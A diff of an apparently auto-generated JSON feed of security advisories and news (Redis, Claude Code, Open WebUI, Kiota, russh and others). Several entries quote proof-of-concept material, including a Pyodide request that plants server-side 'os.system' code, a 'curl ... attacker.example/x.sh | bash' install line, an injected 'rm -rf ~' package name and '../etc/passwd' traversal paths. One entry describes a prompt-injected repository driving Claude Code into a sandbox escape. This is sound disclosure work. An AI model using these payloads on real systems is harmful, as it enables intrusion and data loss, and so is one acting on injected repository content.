@@ -1,8 +1,8 @@
 {
-  "generated": "2026-07-24T13:13:57.379854+00:00",
-  "total": 18,
+  "generated": "2026-07-24T19:09:09.383841+00:00",
+  "total": 35,
   "kev": 0,
-  "zero_day": 16,
+  "zero_day": 14,
   "enriched": 0,
   "findings": [
     {
@@ -43,21 +43,6 @@
       "summary": "Redis shipped seven security releases on July 23 after researchers published authenticated RCE PoCs for stock Redis 6.2.22, 7.4.9, 8.6.4, and 8.8.0.\n\nAll four chains require RESTORE. The Streams chains also need EVAL and XGROUP; the 8.8.0 chain needs EVAL and the bundled RedisBloom module. Redis says the underlying memory flaws may lead to remote code execution.\n\nRedis 6.2.23, 7.2.15, and 7.4.10",
       "link": "https://thehackernews.com/2026/07/kimi-k3-agents-found-redis-zero-days.html",
       "published": "2026-07-24T06:58:27+00:00",
-      "source": "The Hacker News Security",
-      "tags": [
-        "news",
-        "zeroday"
-      ],
-      "cve_ids": [],
-      "is_zero_day": true,
-      "is_high_severity": true
-    },
-    {
-      "id": "https://thehackernews.com/2026/07/threatsday-android-spyware-plc-attacks.html",
-      "title": "ThreatsDay: Android Spyware, PLC Attacks, AI Image Prompt Injection + 12 More Stories",
-      "summary": "Most of this week's trouble came dressed as something useful.\n\nA package stole data. A fake extension opened remote access. A safety app became spyware. An image gave hidden orders to an AI agent. Other threats hid in open systems, weak code, and normal network traffic.\n\n\n The threats change every week. Subscribe, and we\u2019ll alert you when each new ThreatsDay Bulletin is out.\n\n\nThe danger was",
-      "link": "https://thehackernews.com/2026/07/threatsday-android-spyware-plc-attacks.html",
-      "published": "2026-07-23T15:02:07+00:00",
       "source": "The Hacker News Security",
       "tags": [
         "news",
@@ -228,34 +213,364 @@
       "is_high_severity": false
     },
     {
-      "id": "https://thehackernews.com/2026/07/russian-espionage-group-exploited.html",
-      "title": "Russian Espionage Group Exploited Zimbra Zero-Day to Steal Mail and 2FA Codes",
-      "summary": "A Russian state-supported espionage group spent months reading Western mailboxes through a then-unknown flaw in Zimbra's webmail client.\n\nThe payload goes after the last 90 days of email, the organization's entire email directory, the password saved in the browser and the codes kept for two-factor recovery. Opening the message was enough to start it.\n\nThe NSA, CISA and partner agencies published",
-      "link": "https://thehackernews.com/2026/07/russian-espionage-group-exploited.html",
-      "published": "2026-07-23T18:36:08+00:00",
-      "source": "The Hacker News Security",
+      "id": "CVE-2026-55607",
+      "title": "Claude Code: Sandbox Escape via Git Worktree Path Confusion Allows Unsandboxed Code Execution",
+      "summary": "Claude Code's worktree handling allowed creation of worktrees named \".git\" and navigation to worktrees outside the sandbox context, enabling git directory confusion attacks. By exploiting symlink manipulation and git fsmonitor execution during worktree operations, an attacker could overwrite files in the user's home directory (such as .zshenv), leading to code execution outside of seatbelt sandbox restrictions. Reliably exploiting this required the user to clone a malicious repository containing prompt injection content and run Claude Code against it.\n\nUsers on standard Claude Code auto-update have received this fix automatically. Users performing manual updates are advised to update to the latest version.\n\nThank you to hackerone.com/metnew for reporting this issue.",
+      "link": "https://github.com/advisories/GHSA-7835-87q9-rgvv",
+      "published": "2026-07-24T16:54:09Z",
+      "source": "GitHub Security Advisories",
       "tags": [
-        "news",
-        "zeroday"
+        "github",
+        "advisories",
+        "oss"
       ],
-      "cve_ids": [],
+      "cve_ids": [
+        "CVE-2026-55607"
+      ],
       "is_zero_day": true,
       "is_high_severity": false
     },
     {
-      "id": "https://www.bleepingcomputer.com/news/security/russian-hackers-exploit-zimbra-zero-click-flaw-for-email-theft/",
-      "title": "Russian hackers exploit Zimbra zero-click flaw for email theft",
-      "summary": "CISA is warning that the Russian state-sponsored hacking group Laundry Bear, also known as Void Blizzard, is targeting organizations using Zimbra Collaboration email servers by combining phishing attacks with the exploitation of a now-patched Zimbra vulnerability. [...]",
-      "link": "https://www.bleepingcomputer.com/news/security/russian-hackers-exploit-zimbra-zero-click-flaw-for-email-theft/",
-      "published": "2026-07-23T16:49:27+00:00",
-      "source": "Bleeping Computer",
+      "id": "CVE-2026-59222",
+      "title": "Open WebUI: /api/v1/channels/{id}/members exposes full user model including sensitive credentials",
+      "summary": "### Summary\n\nThe channel members endpoint serializes and returns **full user models** for channel participants, including settings objects. A normal user in a DM can retrieve admin-only sensitive configuration such as webhook URLs and tool server key material (`settings.ui.toolServers[].key`), which is not available via standard user info APIs.\n\n### Details\n\nThe endpoint GET `/api/v1/channels/{id}/members` returns the full serialized user model for every member in the channel. In both the DM and non-DM code paths, the handler constructs the response with `[UserModelResponse(**user.model_dump(), is_active=...)]` and returns it as the users list. Because `UserModel` (`models/users.py`) includes a settings object (`UserSettings`) and arbitrary UI configuration (`settings.ui`), the endpoint exposes other users' sensitive configuration to any channel participant.\n\nPractically, a regular user who participates in a DM or group can call `/api/v1/channels/{id}/members` and receive other members' settings, including admin-only details such as webhook notification URLs and tool server configuration, including credential fields like `settings.ui.toolServers[].key`. These values are not returned by the normal user profile endpoints (e.g., `/api/v1/users/{user_id}/info`).\n\n### PoC\n\n1. Start a local Open WebUI instance\n2. Log in as admin and in the Admin Panel, go to Settings -> General and check *Channels (Beta)*, then press Save.\n3. Create a low-privilege user in the Users tab\n4. Click on the admin's profile bottom left, Settings and Integrations. Then click the `+` after *Manage Tool Servers* to add some tool server with a secret Bearer token (eg. `KEY`)\n5. Log in as the attacker with the low-privilege account and create a new Direct Message channel with the admin user:\n\n<img width=\"690\" height=\"383\" alt=\"image\" src=\"https://github.com/user-attachments/assets/70208661-a0db-4457-9984-119056ca3daf\" />\n\n7. After creating, open DevTools with F12 and go to the Network tab. Then in t",
+      "link": "https://github.com/advisories/GHSA-gh7p-78x6-jw6m",
+      "published": "2026-07-24T17:04:55Z",
+      "source": "GitHub Security Advisories",
       "tags": [
-        "news",
-        "malware"
+        "github",
+        "advisories",
+        "oss"
       ],
-      "cve_ids": [],
-      "is_zero_day": true,
-      "is_high_severity": false
+      "cve_ids": [
+        "CVE-2026-59222"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-59213",
+      "title": "Open WebUI: Cross-user model-list exposure via static cache key in get_all_models (aiocache key= vs key_builder= misuse)",
+      "summary": "## Summary\n\nThe `get_all_models` handlers in `routers/openai.py` and `routers/ollama.py` intended to cache their **permission-filtered** model lists per user, but the `@cached` decorator was misconfigured: it passed a `key=` lambda instead of `key_builder=`. In aiocache 0.12.3 (the pinned version), `key=` is a **static** cache key \u2014 a callable passed there is used as a constant object, not invoked per call. As a result the per-user key was never computed, and all callers collided onto a single shared cache entry within the TTL window. During that window, one user's permission-filtered model list could be served to a different authenticated user, crossing the per-user authorization boundary.\n\n## Impact\n\n- **Boundary crossed:** Confidentiality (cross-user). A caller can receive the model list scoped to a *different* security principal than themselves.\n- A user (or admin, or \u2014 depending on endpoint reachability \u2014 anonymous caller) who populates the cache causes the next caller within the TTL to receive *that* list rather than their own permission-filtered one.\n- What's disclosed is the set of models another principal can access, including potentially the existence and naming of models restricted from the receiving user.\n- Exposure is **incidental and timing-dependent**, not attacker-controlled: the leaked entry is whatever the most recent caller populated within `MODELS_CACHE_TTL` (default 1 second), and the attacker cannot select the victim or force a target's list into the cache.\n\n## Affected component\n\n- `backend/open_webui/routers/openai.py` \u2014 `get_all_models` (~line 488)\n- `backend/open_webui/routers/ollama.py` \u2014 `get_all_models` (~line 302)\n\nBoth decorated with `@cached(ttl=MODELS_CACHE_TTL, key=lambda ...)`. No other `@cached(... key=lambda ...)` misuse was found elsewhere in the backend.\n\n## Root cause\n\naiocache 0.12's `@cached` treats `key=` as a static key; the per-call hook is `key_builder=` with signature `key_builder(func, *args, **kwargs)`. Passing a call",
+      "link": "https://github.com/advisories/GHSA-3wp3-xxj9-5jqq",
+      "published": "2026-07-24T17:03:21Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-59213"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-59216",
+      "title": "Open WebUI: Cross-user code-interpreter and tool execution via unvalidated Socket.IO event-caller session_id",
+      "summary": "## Summary\n\nAn authenticated low-privilege user can execute arbitrary code-interpreter Python and tools inside **another** user's authenticated session. The Socket.IO event-caller (`get_event_call`) delivers `execute:python` / `execute:tool` events to a **client-supplied** `session_id` after only checking that the session is connected, never that it belongs to the requester. Combined with `ydoc:document:join`, which exposes the live socket ids of everyone in a shared note's collaboration room to any read-access participant, an attacker can target a victim's session and run attacker-chosen code/tools in the victim's browser context. When the victim is an administrator, that hijacked context reaches the admin-only Functions API, whose source is executed server-side, yielding remote code execution as the server process (root in the default container).\n\n## Affected component\n\n- `backend/open_webui/socket/main.py` \u2014 `get_event_call()` / `__event_caller__`\n- `backend/open_webui/main.py` \u2014 chat-completion metadata (`session_id` taken from the request body)\n\n## Root cause\n\nThe event-caller routes to a caller-controlled session id with no ownership check:\n\n```python\n# backend/open_webui/socket/main.py \u2014 get_event_call()\nasync def __event_caller__(event_data):\n    session_id = request_info['session_id']\n    if session_id not in SESSION_POOL:                 # only checks the session is connected\n        return {'error': 'Client session disconnected.'}\n    return await sio.call('events', {...}, to=session_id, ...)   # delivered to that sid\n```\n\n`session_id` originates from the request body and is never validated against the authenticated user:\n\n```python\n# backend/open_webui/main.py\nmetadata = {\n    'user_id': user.id,                               # server-derived (trustworthy)\n    'session_id': form_data.pop('session_id', None),  # client-controlled\n    ...\n}\n```\n\n`SESSION_POOL[session_id]` is the user record of whoever owns that socket. Because the caller checks only member",
+      "link": "https://github.com/advisories/GHSA-74h3-cxq7-vc5q",
+      "published": "2026-07-24T17:01:53Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-59216"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-59715",
+      "title": "Open WebUI: Unauthenticated WebSocket Access to Collaborative Document Handlers (ydoc:awareness:update, ydoc:document:leave)",
+      "summary": "## Summary\n\nThe Socket.IO server is configured with `always_connect=True` (lines 78, 91 in `backend/open_webui/socket/main.py`) and the `connect` handler (line 329) never rejects unauthenticated connections. Two Ydoc event handlers have zero authentication checks, allowing unauthenticated clients to interact with collaborative document sessions.\n\n## Vulnerable Code\n\n### `ydoc:awareness:update` (line 741) \u2014 No auth check at all\n```python\n@sio.on('ydoc:awareness:update')\nasync def yjs_awareness_update(sid, data):\n    document_id = data['document_id']\n    user_id = data.get('user_id', sid)\n    update = data['update']\n    # No SESSION_POOL check, no room membership check\n    await sio.emit(\n        'ydoc:awareness:update',\n        {'document_id': document_id, 'user_id': user_id, 'update': update},\n        room=f'doc_{document_id}',\n        skip_sid=sid,\n    )\n```\n\n### `ydoc:document:leave` (line 711) \u2014 No auth check at all\n```python\n@sio.on('ydoc:document:leave')\nasync def yjs_document_leave(sid, data):\n    document_id = data['document_id']\n    user_id = data.get('user_id', sid)\n    # No auth check\n    await YDOC_MANAGER.remove_user(document_id=document_id, user_id=sid)\n    await sio.emit('ydoc:user:left',\n        {'document_id': document_id, 'user_id': user_id},\n        room=f'doc_{document_id}')\n```\n\n### Root Cause: `always_connect=True` (line 78)\n```python\nsio = socketio.AsyncServer(\n    always_connect=True,   # Never rejects connections\n    ...\n)\n```\n\nThe `connect` handler (line 329) adds authenticated users to `SESSION_POOL` but never returns `False` or raises an exception for unauthenticated connections.\n\n## Exploitation\n\n1. An unauthenticated attacker connects via Socket.IO (no token needed)\n2. The attacker emits `ydoc:awareness:update` with:\n   - `document_id`: a known/guessed note UUID (format: `note:{uuid}`)\n   - `user_id`: spoofed to impersonate any user\n   - `update`: arbitrary awareness data (fake cursor positions, selections)\n3. The fake awareness data is ",
+      "link": "https://github.com/advisories/GHSA-gmfw-g93r-vg53",
+      "published": "2026-07-24T16:59:44Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-59715"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-59214",
+      "title": "Open WebUI: Stored web worker XSS via Pyodide",
+      "summary": "**Title:** Same-origin Pyodide code execution allows server-side RCE via a shared chat\n\n### Summary\n\nOpen WebUI runs client-side Python (Pyodide) in a same-origin web worker. Through Pyodide's JavaScript API (`pyodide.http.pyfetch`, or the `js` module which exposes the page's `fetch` / `XMLHttpRequest`) executed Python can issue requests on the application origin, and those requests carry the victim's session cookie. A low-privileged user can store such a payload in a chat message, share the chat, and when a victim opens it and clicks **Run** the payload executes authenticated same-origin requests as the victim. When the victim is an admin (or a user holding `workspace.functions` / `workspace.tools` permissions) the payload creates a Function/Tool whose body runs server-side, yielding **remote code execution**.\n\n### Details\n\nPyodide's `js` bridge gives Python in the worker the same reach as inline JavaScript on the origin, and the worker is same-origin, so a credentialed request to the app's own API is authenticated as the victim. No separate XSS sink is required: storing the payload in a shared chat and having the victim run it is enough.\n\n```python\nfrom pyodide.http import pyfetch\nimport json\nawait pyfetch('/api/v1/functions/create', method='POST', credentials='include',\n              headers={'Content-Type': 'application/json'},\n              body=json.dumps({'id': 'x', 'name': 'x', 'meta': {'description': 'x'},\n                               'content': \"import os; os.system('<attacker command>')\"}))\n```\n\n### Impact\n\nWhen the victim runs the shared code, an authenticated low-privileged user achieves remote code execution on the server (the created Function/Tool runs server-side Python) if the victim is an admin or holds `workspace.functions` / `workspace.tools` permissions. More generally the executed code can issue any authenticated request as the victim. Requires the victim to click Run, and Open WebUI configured to use Pyodide.\n\n### Patched\n\nPyodide now runs i",
+      "link": "https://github.com/advisories/GHSA-4r2p-27mh-5m22",
+      "published": "2026-07-24T16:54:40Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-59214"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "GHSA-5xvq-cp9x-6p6r",
+      "title": "Russh: Pre-auth remote panic via all-zero Curve25519 peer public value (encode_mpint OOB)",
+      "summary": "A pre-authentication denial-of-service panic in `russh` 0.62.2 (commit\n`c4be19f1915c8682f4615c3fd50008512b474491`, current default branch `main` as\nof 2026-07-22). An unauthenticated client sends a single `SSH_MSG_KEX_ECDH_INIT`\nwhose `Q_C` is 32 zero bytes. russh's Curve25519 KEX does not reject the\nall-zero peer public value, so `server_dh()` computes the all-zero shared\nsecret and `compute_exchange_hash()` then calls `encode_mpint(&shared.0, ...)`,\nwhich indexes `s[i]` at `i == s.len()` and **panics** (`index out of bounds:\nthe len is 32 but the index is 32`) **before host-key signature verification**.\nThe server KEX task dies on the first KEX message, before authentication.\n\nThis is reachable with the **default** server configuration\n(`Config::default()` \u2192 `Preferred::DEFAULT`, whose kex list includes\n`curve25519-sha256`) and requires **no caller-supplied parameter**. It is\nreproduced end-to-end against the unmodified real russh 0.62.2 library (a real\nserver + raw TCP client over TCP); the PoC below links the real crate, not a\ncopied snippet. The defect is still present on `main` HEAD (`v0.62.3`,\n2026-07-22) and is not covered by any of the 11 published russh GHSA advisories\n(GHSA-cqvm-j2r2-hwpg / CVE-2023-28113 is modp DH group validation, not\nCurve25519).\n\nRust bounds-checked panics abort the task safely (no memory corruption / RCE);\nthe impact is remote **denial of service**.\n\n## Details\n\n`russh/src/kex/curve25519.rs`, `server_dh()` (server path; attacker = client):\n\n```rust\nfn server_dh(&mut self, exchange: &mut Exchange, payload: &[u8]) -> Result<(), crate::Error> {\n    // only the 32-byte length is checked, NOT zero / low-order:\n    let mut pubkey = MontgomeryPoint([0; 32]);\n    pubkey.0.clone_from_slice(&payload[5..5 + 32]);      // line 73\n    ...\n    let shared = server_secret * client_pubkey;           // all-zero when client_pubkey == [0;32]\n    self.shared_secret = Some(shared);                    // line 86\n    Ok(())\n}\n```\n\nThe server then computes",
+      "link": "https://github.com/advisories/GHSA-5xvq-cp9x-6p6r",
+      "published": "2026-07-24T16:45:26Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2023-28113"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-15074",
+      "title": "@fastify/static vulnerable to route guard bypass via path traversal",
+      "summary": "### Impact\n\n`@fastify/static` is vulnerable to a bypass of route-based middleware and guards via non-leading `..` and `%2E%2E` path segments. `find-my-way` does not normalize `..` when matching routes, so a request such as `/foo/../deep/secret.txt` matches the static plugin's catch-all instead of the guarded `/deep/*`. The `getPathnameForSend` helper introduced by the fix for [GHSA-x428-ghpx-8j92](https://github.com/fastify/fastify-static/security/advisories/GHSA-x428-ghpx-8j92) only guards against the `%2F` variant; `..` and `%2E%2E` survive the `decodeURI` + `encodeURI` round-trip and are then collapsed away by `@fastify/send`'s `path.normalize` before its own traversal guard runs.\n\nApplications that rely on route-based middleware or guards to protect files served by `@fastify/static` can be bypassed with non-leading dot-dot path segments.\n\n### Patches\n\nUpgrade to `@fastify/static` 10.1.1.\n\n### Workarounds\n\nDo not use route-based middlewares or guards to protect files served by `@fastify/static`.",
+      "link": "https://github.com/advisories/GHSA-83w8-p2f5-377r",
+      "published": "2026-07-24T16:43:21Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-15074"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-59940",
+      "title": "seroval: `seroval.fromJSON()` Promise resolver type confusion invokes attacker-controlled methods during deserialization",
+      "summary": "## Summary\n\nA type confusion issue in `seroval.fromJSON()` allowed attacker-controlled JSON input to cause Promise control nodes to operate on values from the general deserialization reference table without first verifying that those values were genuine internal promise resolver records.\n\nIn applications that deserialize untrusted Seroval JSON with plugins enabled, this could allow attacker-controlled deserialization side effects. In downstream server frameworks that register plugins returning callable wrappers, this primitive could become unintended server-side invocation and, depending on exposed application functionality, remote code execution or equivalent server compromise.\n\nThe issue was fixed in `seroval@1.5.3`.\n\n## Affected package\n\n- Package: `seroval`\n- Affected API: `fromJSON()`\n- Affected versions: versions prior to `1.5.3` that contain the vulnerable Promise resolver reference handling\n- Patched version: `1.5.3`\n\n## Impact\n\nThe vulnerable deserialization path could confuse attacker-created values in the general reference table with Seroval's internal promise resolver records.\n\nDirect impact in `seroval` is a deserialization side-effect primitive when untrusted JSON is deserialized with plugins enabled. Downstream impact depends on registered plugins and framework usage. If a downstream framework registers plugins that deserialize sensitive callable wrappers, attacker-controlled input may be able to trigger unintended server-side invocation during deserialization.\n\nA concrete downstream impact scenario was validated privately against TanStack Start before the `1.5.3` fix. With `seroval@1.5.3`, the downstream reproducer no longer succeeds.\n\n## Remediation\n\nUpgrade to `seroval@1.5.3` or later.\n\nDownstream projects that accept Seroval JSON from untrusted clients should also consider defense-in-depth controls:\n\n- restrict accepted Seroval node types for client-to-server payloads;\n- allowlist plugin tags for inbound deserialization;\n- avoid registering plugin",
+      "link": "https://github.com/advisories/GHSA-mv8w-475r-vwqw",
+      "published": "2026-07-24T16:14:05Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-59940"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-59949",
+      "title": "LZ4 Java: Native XXHash implementations can crash the JVM when passed invalid byte array ranges",
+      "summary": "### Summary\n\nInsufficient validation of byte array arguments in JNI-based XXHash implementations in lz4-java 1.11.0 and earlier allows callers to crash the JVM by passing an invalid array reference or invalid range to native XXHash methods.\n\nThis affects applications where an attacker can influence the byte array object or the `off` / `len` arguments passed to affected XXHash APIs. It does **not** affect the common case where only the contents of a valid byte array are attacker-controlled.\n\nJava-based XXHash implementations are *not* affected.\n\n### Details\n\nThe JNI-backed XXHash implementations pass caller-provided byte array arguments to native code. The affected APIs are:\n\n- `XXHashFactory.nativeInstance().hash32().hash(byte[] buf, int off, int len, int seed)`\n- `XXHashFactory.nativeInstance().hash64().hash(byte[] buf, int off, int len, long seed)`\n- `XXHashFactory.nativeInstance().newStreamingHash32(seed).update(byte[] bytes, int off, int len)`\n- `XXHashFactory.nativeInstance().newStreamingHash64(seed).update(byte[] bytes, int off, int len)`\n\nBefore the fix, the streaming JNI implementations did not validate `bytes`, `off`, or `len` before calling `XXHashJNI.XXH32_update` / `XXHashJNI.XXH64_update`. The non-streaming JNI implementations called `SafeUtils.checkRange`, but `SafeUtils.checkRange(byte[], int, int)` skipped all array access when `len == 0`, so a null byte array with a zero length could still reach JNI.\n\nAs a result:\n\n- `hash(null, 0, 0, seed)` and `update(null, 0, 0)` could pass a null array reference to JNI, causing a fatal JVM crash in `GetPrimitiveArrayCritical`.\n- `update(new byte[16], 0, Integer.MAX_VALUE)` could cause native XXHash code to read far beyond the end of the Java array, causing a fatal JVM crash and potentially exposing in-process memory to the native routine before the crash.\n\nThe oversized-length non-streaming `hash(new byte[16], 0, Integer.MAX_VALUE, seed)` case was already rejected in Java before this fix. The missing validation ",
+      "link": "https://github.com/advisories/GHSA-xx22-p4ch-683r",
+      "published": "2026-07-24T16:13:41Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-59949"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-59865",
+      "title": "Microsoft Kiota: Command injection via x-ms-kiota-info dependencyInstallCommand surfaced by `kiota info`",
+      "summary": "### Summary\n\n`kiota info` \u2014 the command developers run to learn which packages to install after generating a client \u2014\nread the `x-ms-kiota-info` extension from the OpenAPI description and presented the spec-supplied\n`dependencyInstallCommand` (and dependency `name`/`version`) **as the tool's own recommended install\ncommand**, replacing kiota's normally-trusted suggestion. With an attacker-controlled or compromised\ndescription:\n\n```\n$ kiota info -d <attacker-spec> -l CSharp\n   ...\n   Hint: use the install command to install the dependencies.\n   Example:\n      curl -s https://attacker.example/x.sh | bash   # attacker-controlled\n```\n\nA developer who followed kiota's explicit instruction (run the suggested install command) executed\nattacker-controlled shell \u2014 **command injection \u2192 RCE**. The IDE-facing `kiota info --json` output, which the\nKiota **VS Code extension** consumes to offer/run dependency installation, exposed the raw command string\ndirectly, so an \"install dependencies\" action in the IDE could run it automatically.\n\nConfirmed on Kiota **1.32.4**.\n\n### Details\n\n`x-ms-kiota-info.languagesInformation.<language>.dependencyInstallCommand` was emitted verbatim as the\ninstall-command example, and `dependencies[].name`/`version` were shown verbatim in the package table:\n\n```\n# spec\nx-ms-kiota-info:\n  languagesInformation:\n    CSharp:\n      dependencyInstallCommand: \"curl -s https://attacker.example/x.sh | bash\"\n      dependencies: [{ name: \"Evil.Pkg; rm -rf ~\", version: \"1.0.0\", type: bundle }]\n```\n\nWithout `x-ms-kiota-info`, kiota suggests its own trusted command (e.g.\n`dotnet add package Microsoft.Kiota.Authentication.Azure --version 2.0.0`); the spec's value **replaced** it.\n`kiota info --json` (consumed by the Kiota VS Code extension) emitted the attacker command in\n`dependencyInstallCommand`.\n\n### Impact\n\nA developer who ran `kiota info` on an attacker-controlled or compromised OpenAPI description and followed\nkiota's instruction to run the suggested install co",
+      "link": "https://github.com/advisories/GHSA-hq9q-27g5-qwpj",
+      "published": "2026-07-24T16:11:46Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-59865"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-59863",
+      "title": "Microsoft Kiota Workspace-config poisoning: out-of-repo file write + generation-time SSRF",
+      "summary": "### Summary\n\nMicrosoft Kiota honors a poisoned `.kiota/workspace.json` \u2014 the workspace configuration that Kiota's\ndocumented team workflow has developers commit to their repository \u2014 **unvalidated** on\n`kiota client generate` / `kiota plugin generate`. A repository (or pull request) containing a malicious\nper-client / per-plugin `outputPath` causes Kiota, when a developer or CI runs the documented regenerate\ncommand, to **(CWE-22) write the entire generated client to an arbitrary path outside the workspace** \u2014 the\n`outputPath` was not confined to the workspace root and absolute paths were accepted.\n\nConfirmed on Kiota **1.32.4** (`KIOTA_CONFIG_PREVIEW=true`, the self-contained `linux-x64` release binary).\n\n### Details\n\n```jsonc\n// .kiota/workspace.json (committed to the repo)\n\"clients\": { \"MyClient\": {\n   \"outputPath\": \"/abs/path/outside/repo/pwned_client\"   // -> generated client written here (CWE-22)\n}}\n```\n\nRunning `kiota client generate --client-name MyClient` in the repo writes `MyClient.cs`,\n`P/PRequestBuilder.cs`, \u2026 to the attacker-chosen `outputPath` (verified outside the working tree).\n\n#### Note on `descriptionLocation`\n\nThe per-consumer `descriptionLocation` is intentionally fetched at generation time \u2014 this is how Kiota knows\nwhere to pull an updated description from when refreshing a client, the same way any other value in a\ncommitted lock/config file is honored. It is **not** treated as a vulnerability and is unchanged; only\n`outputPath` is now confined.\n\n### Impact\n\nA malicious or compromised repository \u2014 or a malicious PR that edits `.kiota/workspace.json` \u2014 leads to\narbitrary file write on the developer's or CI host's filesystem (overwrite source/build files, drop files in\nauto-loaded locations) whenever a teammate clones/pulls and runs the documented `kiota client generate` /\n`kiota plugin generate` to refresh the client. CWE-22.\n\nThis is a different trust boundary from the OpenAPI-description-based findings: the malicious input is the\nKiota **conf",
+      "link": "https://github.com/advisories/GHSA-4rj6-vrwv-wr8m",
+      "published": "2026-07-24T16:11:24Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-59863"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-59867",
+      "title": "Microsoft Kiota: Generation-time SSRF + remote/local file inclusion via unrestricted $ref",
+      "summary": "## Summary\n\nMicrosoft Kiota resolved OpenAPI `$ref`s by fetching remote `http(s)` URLs and reading local files\n(including absolute / out-of-tree paths), inlining the referenced schema into the generated client.\nRunning `kiota generate` on a spec whose `$ref` pointed at an attacker/internal URL or an arbitrary\nlocal file yielded SSRF, remote file inclusion, and local file inclusion. Verified on **1.32.3 / 1.32.4**.\n\n### Details\n\n- `$ref: http://attacker/internal-evil.json#/...` \u2192 build host fetches the URL (SSRF) and inlines the\n  remote schema (RFI); confirmed property `REMOTE_KIOTA_PROP` in the generated client.\n- `$ref: /abs/path.json#/...` or `../../secret.json#/...` \u2192 Kiota reads the out-of-tree local file and\n  inlines its schema (LFI); confirmed `Leaked` schema in the generated client. Resolution is transitive\n  across nesting levels.\n\nKiota **escapes** its output sinks (comments/strings/identifiers), so attacker-controlled remote/local\ncontent cannot break out into code \u2014 no RCE. The chain stops at SSRF + RFI + LFI.\n\n### Impact\n\nBuild-time SSRF (CWE-918) from the developer or CI host, disclosure of arbitrary local files (CWE-22), and\ninclusion of untrusted remote content (CWE-829), from running the generator on an attacker-controlled or\nattacker-influenced OpenAPI description. No code execution. Notable because Kiota is otherwise the hardened\ngenerator (it resists the code-injection class).\n\nThe relevant threat is not \"change the generated output\" (an attacker who fully controls the description can\nalready do that) but the **side effects on the build host**: outbound requests from inside the CI network\n(cloud metadata, internal-only services) and reads of local files the attacker never possessed, whose contents\nare then inlined into the generated \u2014 and typically committed/published \u2014 client. It also bypasses controls\nthat review the description document but not externally-referenced content.\n\n### Patches\n\nFixed in **1.32.5** (https://github.com/microsoft/kiot",
+      "link": "https://github.com/advisories/GHSA-rg4h-fpcp-2qm8",
+      "published": "2026-07-24T16:10:17Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-59867"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-59864",
+      "title": "Microsoft Kiota: Path/URL injection into generated Copilot plugin manifest via x-ai-* extensions",
+      "summary": "### Summary\n\n`kiota plugin add` / `kiota plugin generate` (with `-t APIPlugin`) emits an attacker-controlled `static_template.file` path from the AI-plugin extensions (`x-ai-adaptive-card`, `x-ai-capabilities`) **verbatim**, with no path validation, into the generated Microsoft 365 Copilot / Teams plugin manifest (`<name>-apiplugin.json`). An attacker-controlled or compromised OpenAPI description can therefore embed a `../` / absolute path into the manifest's `response_semantics.static_template.file`, yielding a **path traversal (CWE-22)** / out-of-package file inclusion (CWE-829) that is resolved by the AI host when the generated plugin is deployed.\n\nConfirmed on Kiota **1.32.4** (`KIOTA_CONFIG_PREVIEW=true`, the self-contained `linux-x64` release binary).\n\n### Details\n\nBoth extension paths write the `static_template.file` reference straight into the manifest without sanitization \u2014 `PluginsGenerationService.GetResponseSemanticsFromAdaptiveCardExtension` mints `static_template = {\"file\": <File>}`, and the `x-ai-capabilities` path copies the `static_template` object through:\n\n```\n# spec                                                  -> generated manifest (functions[].capabilities.response_semantics)\nx-ai-adaptive-card: {title: T, data_path: $.x,\n   file: \"../../../../../../etc/passwd\"}                -> static_template.file = \"../../../../../../etc/passwd\"   (CWE-22)\nx-ai-capabilities.response_semantics.static_template:\n   {file: \"../../../../../../etc/passwd\"}               -> static_template.file = \"../../../../../../etc/passwd\"   (CWE-22)\n```\n\n(`x-ai-adaptive-card.file` only reaches the manifest when `title` is set, so `GetResponseSemanticsFromAdaptiveCardExtension` fires; otherwise kiota writes its own template card instead.)\n\n### Impact\n\n**This is not local code execution on the build host.** The injected path is written into the generated plugin manifest and realized **downstream**, when the plugin is packaged and sideloaded / deployed to an AI host (Microsof",
